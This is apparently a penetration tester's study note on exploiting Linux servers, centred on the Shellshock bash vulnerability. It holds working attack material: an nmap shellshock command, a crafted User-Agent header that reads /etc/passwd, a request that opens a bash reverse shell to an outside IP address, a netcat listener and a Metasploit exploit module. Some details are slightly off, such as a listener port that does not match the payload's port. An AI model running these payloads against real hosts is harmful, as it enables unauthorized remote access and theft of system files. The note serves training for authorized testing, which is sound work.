--- 
Linux has various use cases, however, it is typically deployed as a server operating system. For this reason, there are specific services and protocols that will typically be found running on a Linux server.

These services provide an attacker with an access vector that they can utilize to gain access to a target host.

**Having a good understanding of what these services are, how they work and their potential vulnerabilities is a vitally important skill to have as a penetration tester.**

![[Pasted image 20230416082427.png]]

## Exploiting Linux Vulnerabilities

### CVE-2014-6271 - Shellshock
 Shellshock (CVE-2014-6271) is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that **allow an attacker to execute remote arbitrary commands** via Bash, consequently allowing the attacker to obtain remote access to the target system via a reverse shell.

- The Shellshock vulnerability was discovered by Stéphane Chazelas on the 12th of September 2014 and was made public on the 24th of September 2014.
- Bash is a \*Nix shell that is part of the GNU project and is the default shell for most Linux distributions.

In order to exploit this vulnerability, you will need to locate an input vector or script that allows you to communicate with Bash.

- In the context of an Apache web server, we can utilize any legitimate CGI scripts accessible on the web server.

-  Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with Bash.

-  This vulnerability can be exploited both manually and automatically with the use of an MSF exploit module.

#### Manual Exploration
Enumetating using Nmap
``` bash
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>

# Attempts to exploit the "shellshock" vulnerability (CVE-2014-6271 and CVE-2014-7169) in web applications.
```

Change the Request section with the following code to test whether the target is vulnerable or not.
``` http
GET /cgi-bin/status HTTP/1.0  
User-Agent: () { :; }; echo; echo; /bin/bash -c "cat /etc/passwd"

```

For getting a revere shell, use the above request.
```http
GET /cgi-bin/status HTTP/1.1  
Host: 192.168.169.139  
User-Agent: () { :; }; echo; echo; /bin/bash -c " bash -i >& /dev/tcp/192.144.111.2/1234 0>&1"
Accept: text/html, application/xhtml-xml, application/xml;q=0.9,*/*;q=0.8  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Connection: close  
Upgrade-Insecure-Requests: 1
```

``` bash
 nc -nlvp 1337
 ```

#### Exploit Using Metasploit
```
msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf exploit(apache_mod_cgi_bash_env_exec) > exploit
```


> **FOR**:
> 	Exploiting FTP
> 	Exploiting SSH
> 	Exploiting SAMBA
  **[[4 Enumeration]]** section fouces on enumeration and exploiting these services.